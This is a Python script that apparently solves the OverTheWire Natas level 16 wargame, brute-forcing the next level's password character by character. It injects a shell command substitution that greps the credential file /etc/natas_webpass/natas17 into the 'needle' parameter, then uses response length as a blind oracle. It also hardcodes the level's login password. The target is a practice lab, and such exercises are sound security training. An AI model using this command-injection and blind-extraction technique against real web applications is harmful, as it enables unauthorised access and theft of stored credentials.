import requests

#define variables used for logon
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
url = "http://natas16.natas.labs.overthewire.org"

#create lists of characters to go through and final password variable
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
final_password = ''

#loop to go through every character for every index of the password
print("Starting password crack...")
for i in range(0,32):
    print("Password: "+final_password)
    for j in range(0,62):
        print("Checking character:"+chars[j])
        parameters = 'needle=$(grep -E ^'+final_password+chars[j]+'.*$ /etc/natas_webpass/natas17)'
        response = requests.get(url, params=parameters, auth=(username,password))
        if(len(response.text) == 1105):
            print("Character "+chars[j]+" found")
            final_password += chars[j]
            break

#print final password
print("Password found: "+final_password)

